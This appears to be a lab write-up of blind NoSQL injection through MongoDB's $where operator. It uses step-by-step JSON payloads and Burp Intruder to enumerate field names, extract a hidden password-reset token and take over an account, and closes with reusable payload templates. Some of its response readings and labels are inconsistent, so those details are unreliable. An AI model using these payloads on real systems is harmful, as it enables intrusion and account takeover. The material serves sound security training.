# NoSQL $where Exploitation Walkthrough

## Overview

This is a step-by-step guide for exploiting NoSQL injection using the `$where` operator to extract a hidden password reset token from a MongoDB database.

**Prerequisites:** JavaScript must be enabled in MongoDB for `$where` to work.

---

## Step 1: Confirm `$where` JavaScript Execution

First, establish that boolean-based blind injection is possible by testing true/false conditions.

**Test true condition:**
```json
{
  "username": "carlos",
  "password": {"$ne": ""},
  "$where": "function(){ return 1;}"
}
```
*Response: "Account locked" → True condition works*

**Test false condition:**
```json
{
  "username": "carlos",
  "password": {"$ne": ""},
  "$where": "function(){ return 0;}"
}
```
*Response: "Invalid account" → False condition works*

✅ **Confirmed:** Boolean-based blind injection is possible

**Response Indicators:**
| Response | Meaning |
|----------|---------|
| "Account locked" | Condition is TRUE |
| "Invalid account" | Condition is FALSE |

---

## Step 2: Verify Known Fields (Sanity Check)

Before hunting for unknown fields, confirm that field enumeration works by checking known fields.

**Check first field is `_id`:**
```json
{
  "username": "carlos",
  "password": {"$ne": ""},
  "$where": "function(){ if(Object.keys(this)[0].match('^_id')) return 1; else 0;}"
}
```
*Response: "Account locked" → Confirmed*

**Check second field is `username`:**
```json
{
  "username": "carlos",
  "password": {"$ne": ""},
  "$where": "function(){ if(Object.keys(this)[1].match('^username')) return 1; else 0;}"
}
```
*Response: "Account locked" → Confirmed*

✅ **Confirmed:** Field enumeration via `Object.keys(this)` works

---

## Step 3: Discover Unknown Fields

Iterate through field indices to find additional fields.

**Test field index 3:**
```json
"$where": "function(){ if(Object.keys(this)[3].match('^aaa')) return 1; else 0;}"
```
*Response: "Invalid user" → Field exists (later found to be `email`)*

**Test field index 4:**
```json
"$where": "function(){ if(Object.keys(this)[4].match('^aaa')) return 1; else 0;}"
```
*Response: "Invalid user"  → Field exists, needs enumeration*
**Test field index 4:**
```json
"$where": "function(){ if(Object.keys(this)[5].match('^aaa')) return 1; else 0;}"
```
*Response: "Internal server error" → Field doesn't exist (out of bounds)*

✅ **Found:** Document has 5 fields (indices 0-4)

---

## Step 4: Get Unknown Field Name Length

Determine the length of the unknown field at index 4.

```json
"$where": "function(){ if(Object.keys(this)[4].length==5) return 1; else 0;}"   // No
"$where": "function(){ if(Object.keys(this)[4].length==8) return 1; else 0;}"   // No
"$where": "function(){ if(Object.keys(this)[4].length==10) return 1; else 0;}"  // Yes!
```

✅ **Found:** Field name is 10 characters long

---

## Step 5: Extract Field Name Character-by-Character

Use Burp Intruder to fuzz each character position.

**First character:**
```json
"$where": "function(){ if(Object.keys(this)[4].match('^a')) return 1; else 0;}"  // No
"$where": "function(){ if(Object.keys(this)[4].match('^r')) return 1; else 0;}"  // Yes!
```

**Continue building the string:**
```json
"$where": "function(){ if(Object.keys(this)[4].match('^r')) return 1; else 0;}"
"$where": "function(){ if(Object.keys(this)[4].match('^re')) return 1; else 0;}"
"$where": "function(){ if(Object.keys(this)[4].match('^res')) return 1; else 0;}"
"$where": "function(){ if(Object.keys(this)[4].match('^rese')) return 1; else 0;}"
"$where": "function(){ if(Object.keys(this)[4].match('^reset')) return 1; else 0;}"
"$where": "function(){ if(Object.keys(this)[4].match('^resetT')) return 1; else 0;}"
"$where": "function(){ if(Object.keys(this)[4].match('^resetTo')) return 1; else 0;}"
"$where": "function(){ if(Object.keys(this)[4].match('^resetTok')) return 1; else 0;}"
"$where": "function(){ if(Object.keys(this)[4].match('^resetToke')) return 1; else 0;}"
"$where": "function(){ if(Object.keys(this)[4].match('^resetToken')) return 1; else 0;}"
```

**Final payload to confirm:**
```json
{
  "username": "carlos",
  "password": {"$ne": ""},
  "$where": "function(){ if(Object.keys(this)[4].match('^resetToken')) return 1; else 0;}"
}
```

✅ **Found:** Field name is `resetToken`

---

## Step 6: Determine Token Value Character Types

Before extracting the value, check what character types it contains.

**Check for non-digits (letters):**
```json
"$where": "function(){ if(this.resetToken.match(/\\D/)) return 1; else 0;}"
```
*Response: "Account locked" → Contains letters*

**Check for digits:**
```json
"$where": "function(){ if(this.resetToken.match(/\\d/)) return 1; else 0;}"
```
*Response: "Account locked" → Contains digits*

✅ **Found:** Token contains both letters (a-f) and digits (0-9) — likely hex

**Useful Regex Patterns:**
| Pattern | Meaning |
|---------|---------|
| `\d` | Digits (0-9) |
| `\D` | Non-digits (letters, symbols) |
| `\w` | Word characters (a-z, A-Z, 0-9, _) |
| `\W` | Non-word characters |
| `[a-f]` | Lowercase hex letters |
| `[0-9a-f]` | Full hex charset |

---

## Step 7: Get Token Value Length

```json
"$where": "function(){ if(this.resetToken.length==10) return 1; else 0;}"  // No
"$where": "function(){ if(this.resetToken.length==16) return 1; else 0;}"  // Yes!
```

✅ **Found:** Token is 16 characters long

---

## Step 8: Extract Token Value Character-by-Character

Use Burp Intruder to fuzz each position with hex charset (0-9, a-f).

```json
"$where": "function(){ if(this.resetToken.match('^1')) return 1; else 0;}"
"$where": "function(){ if(this.resetToken.match('^14')) return 1; else 0;}"
"$where": "function(){ if(this.resetToken.match('^147')) return 1; else 0;}"
"$where": "function(){ if(this.resetToken.match('^1473')) return 1; else 0;}"
"$where": "function(){ if(this.resetToken.match('^14730')) return 1; else 0;}"
"$where": "function(){ if(this.resetToken.match('^147303')) return 1; else 0;}"
"$where": "function(){ if(this.resetToken.match('^147303d')) return 1; else 0;}"
"$where": "function(){ if(this.resetToken.match('^147303d6')) return 1; else 0;}"
"$where": "function(){ if(this.resetToken.match('^147303d6d')) return 1; else 0;}"
"$where": "function(){ if(this.resetToken.match('^147303d6db')) return 1; else 0;}"
"$where": "function(){ if(this.resetToken.match('^147303d6db2')) return 1; else 0;}"
"$where": "function(){ if(this.resetToken.match('^147303d6db2f')) return 1; else 0;}"
"$where": "function(){ if(this.resetToken.match('^147303d6db2f2')) return 1; else 0;}"
"$where": "function(){ if(this.resetToken.match('^147303d6db2f24')) return 1; else 0;}"
"$where": "function(){ if(this.resetToken.match('^147303d6db2f240')) return 1; else 0;}"
"$where": "function(){ if(this.resetToken.match('^147303d6db2f2400')) return 1; else 0;}"
```

✅ **Extracted:** `147303d6db2f2400`

---

## Step 9: Exploit — Reset Password

Use the extracted token in the password reset URL:

```
https://target.com/forgot-password?token=147303d6db2f2400
```

✅ **Success:** Password reset page loads, account compromised

---

## Summary Table

| Step | Action | Key Payload |
|------|--------|-------------|
| 1 | Confirm boolean injection | `return 1;` vs `return 0;` |
| 2 | Verify known fields | `Object.keys(this)[0].match('^_id')` |
| 3 | Find unknown field indices | `Object.keys(this)[4]` exists? |
| 4 | Get field name length | `Object.keys(this)[4].length==10` |
| 5 | Extract field name | `Object.keys(this)[4].match('^resetToken')` |
| 6 | Check value charset | `this.resetToken.match(/\\d/)` |
| 7 | Get value length | `this.resetToken.length==16` |
| 8 | Extract value | `this.resetToken.match('^147303d6db2f2400')` |
| 9 | Exploit | Use token in reset URL |

---

## Key Concepts

### The `this` Keyword
In MongoDB `$where`, `this` refers to the **current document** being evaluated.

```javascript
this.username      // Access username field
this.resetToken    // Access resetToken field
this["field"]      // Bracket notation alternative
```

### Object.keys()
Returns an array of all field names in the document.

```javascript
Object.keys(this)           // ["_id", "username", "password", "email", "resetToken"]
Object.keys(this)[0]        // "_id"
Object.keys(this)[4]        // "resetToken"
Object.keys(this).length    // 5
```

### match() with Regex
Tests if a string matches a pattern.

```javascript
"resetToken".match('^reset')     // true (starts with "reset")
"resetToken".match('^token')     // false
"abc123".match(/\d/)             // true (contains digit)
"abc123".match(/\D/)             // true (contains non-digit)
```

---

## Burp Intruder Tips

1. **Attack Type:** Sniper (single position)
2. **Payload Set:** 
   - For field names: `a-z` + `A-Z` + `_`
   - For hex tokens: `0-9` + `a-f`
3. **Grep Match:** Add response indicators ("Account locked", "Invalid account")
4. **Throttle:** Add delay if rate-limited
5. **Incremental:** Build string one character at a time

---

## Quick Payload Templates

### Check if field exists at index N
```json
"$where": "function(){ if(Object.keys(this)[N]) return 1; else 0;}"
```

### Get field name length at index N
```json
"$where": "function(){ if(Object.keys(this)[N].length==LENGTH) return 1; else 0;}"
```

### Extract field name character at position P
```json
"$where": "function(){ if(Object.keys(this)[N][P]=='CHAR') return 1; else 0;}"
```

### Extract field name with prefix matching
```json
"$where": "function(){ if(Object.keys(this)[N].match('^PREFIX')) return 1; else 0;}"
```

### Get field value length
```json
"$where": "function(){ if(this.FIELDNAME.length==LENGTH) return 1; else 0;}"
```

### Extract field value with prefix matching
```json
"$where": "function(){ if(this.FIELDNAME.match('^PREFIX')) return 1; else 0;}"
```

### Check value contains digits
```json
"$where": "function(){ if(this.FIELDNAME.match(/\\d/)) return 1; else 0;}"
```

### Check value contains letters
```json
"$where": "function(){ if(this.FIELDNAME.match(/\\D/)) return 1; else 0;}"
```

---

## ⚠️ Important Notes

- `$where` only works if JavaScript is enabled in MongoDB
- This is a **blind** attack — no direct data output
- Response differences are critical — identify true/false indicators
- Burp Intruder Community Edition is slower but works
- Always test in authorized environments only
